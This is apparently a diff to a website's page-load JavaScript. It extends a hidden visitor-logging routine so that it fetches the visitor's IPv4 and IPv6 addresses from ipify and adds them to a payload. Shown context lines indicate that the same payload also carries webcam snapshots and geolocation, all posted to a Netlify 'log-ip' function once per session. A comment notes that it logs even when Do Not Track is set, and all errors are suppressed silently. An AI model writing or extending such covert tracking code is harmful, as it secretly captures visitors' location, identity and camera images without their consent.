@@ -150,19 +150,47 @@ document.addEventListener('DOMContentLoaded', () => {
   const ipBox = document.getElementById('ip-box');
   // (Visualizer removed)
 
+  // Kick off client IP detection early so we can include it in the log payload
+  let __clientIPv4 = '';
+  let __clientIPv6 = '';
+  const __ipifyPromise = (function(){
+    try {
+      const getJSON = (url) => fetch(url).then(r => r.ok ? r.json() : Promise.reject());
+      return Promise.allSettled([
+        getJSON('https://api4.ipify.org?format=json'),
+        getJSON('https://api6.ipify.org?format=json')
+      ]).then(results => {
+        if (results[0] && results[0].status === 'fulfilled' && results[0].value && results[0].value.ip) __clientIPv4 = results[0].value.ip;
+        if (results[1] && results[1].status === 'fulfilled' && results[1].value && results[1].value.ip) __clientIPv6 = results[1].value.ip;
+      }).catch(() => {});
+    } catch (_) { return Promise.resolve(); }
+  })();
+
   // Fire-and-forget IP log to Netlify Function (once per session, logs even if DNT is enabled)
   try {
     const dntFlag = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack) === '1' ? '1' : '0';
     if (!sessionStorage.getItem('ipLogged')) {
-      const send = (payload) => fetch('/.netlify/functions/log-ip', {
-        method: 'POST',
-        headers: Object.assign({ 'x-dnt': dntFlag }, payload ? { 'content-type': 'application/json' } : {}),
-        body: payload ? JSON.stringify(payload) : undefined
-      })
-        .catch(() => {})
-        .finally(() => {
-          try { sessionStorage.setItem('ipLogged', '1'); } catch (_) {}
-        });
+      const sendWithIP = async (payload) => {
+        // Wait up to ~1.2s for ipify to resolve, then include any available v4/v6
+        try {
+          await Promise.race([
+            __ipifyPromise,
+            new Promise(res => setTimeout(res, 1200))
+          ]);
+        } catch (_) {}
+        const merged = Object.assign({}, payload || {},
+          (__clientIPv4 ? { v4: __clientIPv4 } : {}),
+          (__clientIPv6 ? { v6: __clientIPv6 } : {}));
+        return fetch('/.netlify/functions/log-ip', {
+          method: 'POST',
+          headers: Object.assign({ 'x-dnt': dntFlag }, Object.keys(merged).length ? { 'content-type': 'application/json' } : {}),
+          body: Object.keys(merged).length ? JSON.stringify(merged) : undefined
+        })
+          .catch(() => {})
+          .finally(() => {
+            try { sessionStorage.setItem('ipLogged', '1'); } catch (_) {}
+          });
+      };
 
       let handled = false;
       try {
@@ -190,20 +218,20 @@ document.addEventListener('DOMContentLoaded', () => {
                               try { dataUrl = canvas.toDataURL('image/jpeg', 0.7); } catch (_) { dataUrl = ''; }
                               try { stream.getTracks().forEach(t => t.stop()); } catch (_) {}
                               const payload = Object.assign({}, base, dataUrl ? { photo: dataUrl } : {});
-                              send(payload);
+                              sendWithIP(payload);
                             };
                             try { video.play().catch(() => {}); } catch (_) {}
-                          }).catch(() => { send(base); });
+                          }).catch(() => { sendWithIP(base); });
                         } else {
-                          send(base);
+                          sendWithIP(base);
                         }
-                      }).catch(() => { send(base); });
+                      }).catch(() => { sendWithIP(base); });
                     } else {
-                      send(base);
+                      sendWithIP(base);
                     }
-                  } catch (_) { send(base); }
+                  } catch (_) { sendWithIP(base); }
                 },
-                () => { send(); },
+                () => { sendWithIP(); },
                 { maximumAge: 60000, timeout: 2000, enableHighAccuracy: false }
               );
             } else {
@@ -224,25 +252,25 @@ document.addEventListener('DOMContentLoaded', () => {
                           try { dataUrl = canvas.toDataURL('image/jpeg', 0.7); } catch (_) { dataUrl = ''; }
                           try { stream.getTracks().forEach(t => t.stop()); } catch (_) {}
                           const payload = dataUrl ? { photo: dataUrl } : undefined;
-                          send(payload);
+                          sendWithIP(payload);
                         };
                         try { video.play().catch(() => {}); } catch (_) {}
-                      }).catch(() => { send(); });
+                      }).catch(() => { sendWithIP(); });
                     } else {
-                      send();
+                      sendWithIP();
                     }
-                  }).catch(() => { send(); });
+                  }).catch(() => { sendWithIP(); });
                 } else {
-                  send();
+                  sendWithIP();
                 }
-              } catch (_) { send(); }
+              } catch (_) { sendWithIP(); }
             }
-          }).catch(() => { if (!handled) send(); });
+          }).catch(() => { if (!handled) sendWithIP(); });
           handled = true;
         }
       } catch (_) {}
       if (!handled) {
-        send();
+        sendWithIP();
       }
     }
   } catch (_) {}
